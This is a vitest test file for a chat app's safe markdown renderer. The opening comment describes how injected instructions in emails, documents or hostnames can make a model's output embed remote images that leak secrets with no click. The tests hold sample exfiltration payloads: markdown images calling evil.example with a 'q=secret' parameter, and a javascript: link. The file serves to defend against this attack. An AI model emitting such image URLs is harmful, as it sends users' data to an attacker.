/**
 * WARP-3193 SEC-INJ-1 — model output is attacker-influenced (an email, a
 * document, a DHCP hostname can carry an injected instruction), so the
 * markdown renderers for it must never let the BROWSER fetch a remote URL on
 * its own. A remote `![](https://evil/?q=<secrets>)` is a zero-click
 * exfiltration channel that bypasses the box's egress screening entirely.
 */
import { describe, it, expect, vi } from "vitest";
import { render } from "@testing-library/react";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import { SAFE_MARKDOWN_COMPONENTS } from "@/components/chat/safe-markdown";

function md(source: string) {
  return render(
    <ReactMarkdown components={SAFE_MARKDOWN_COMPONENTS}>{source}</ReactMarkdown>,
  ).container;
}

describe("SAFE_MARKDOWN_COMPONENTS (SEC-INJ-1)", () => {
  it("renders a same-origin /api/ image", () => {
    const c = md("![chart](/api/files/thumbnail?path=%2Fa.png)");
    const img = c.querySelector("img");
    expect(img).not.toBeNull();
    expect(img!.getAttribute("src")).toBe("/api/files/thumbnail?path=%2Fa.png");
    expect(img!.getAttribute("alt")).toBe("chart");
  });

  it.each([
    "https://evil.example/?q=secret",
    "http://evil.example/x.png",
    "//evil.example/x.png",
    "/files/x.png",
    "/apifoo/x.png",
    "data:image/png;base64,AAAA",
  ])("renders %s as inert text, never an <img>", (src) => {
    const c = md(`![leak](${src})`);
    expect(c.querySelector("img")).toBeNull();
    expect(c.textContent).toContain("[image: leak]");
    // The URL itself is not echoed — it may carry the exfiltrated payload.
    expect(c.textContent).not.toContain("evil");
  });

  // WARP-3917: the whole message, as ChatMessage renders it (GFM autolinks on):
  // a remote image plus a bare URL must create no <img> and fire no fetch. A
  // bare URL becomes a plain <a> the person has to click — no unfurl/preview.
  it("a remote image and a bare URL load nothing until clicked", () => {
    const fetchSpy = vi.spyOn(globalThis, "fetch");
    const c = render(
      <ReactMarkdown remarkPlugins={[remarkGfm]} components={SAFE_MARKDOWN_COMPONENTS}>
        {"![x](https://evil.example/p.png?q=secret)\n\nsee https://evil.example/page?q=secret\n\n![ref][r]\n\n[r]: https://evil.example/r.png"}
      </ReactMarkdown>,
    ).container;
    expect(c.querySelector("img")).toBeNull();
    expect(c.querySelector("iframe, video, audio, link, object, embed")).toBeNull();
    const a = c.querySelector("a")!;
    expect(a.getAttribute("href")).toBe("https://evil.example/page?q=secret");
    expect(a.getAttribute("rel")).toBe("noopener noreferrer");
    expect(fetchSpy).not.toHaveBeenCalled();
    fetchSpy.mockRestore();
  });

  it("keeps links clickable with noopener/noreferrer", () => {
    const c = md("[docs](https://example.com/page)");
    const a = c.querySelector("a")!;
    expect(a.getAttribute("href")).toBe("https://example.com/page");
    expect(a.getAttribute("rel")).toBe("noopener noreferrer");
    expect(a.getAttribute("target")).toBe("_blank");
  });

  it("blocks javascript: links", () => {
    const c = md("[click](javascript:void(0))");
    const a = c.querySelector("a");
    expect(a?.getAttribute("href") ?? "").not.toMatch(/javascript/i);
  });
});
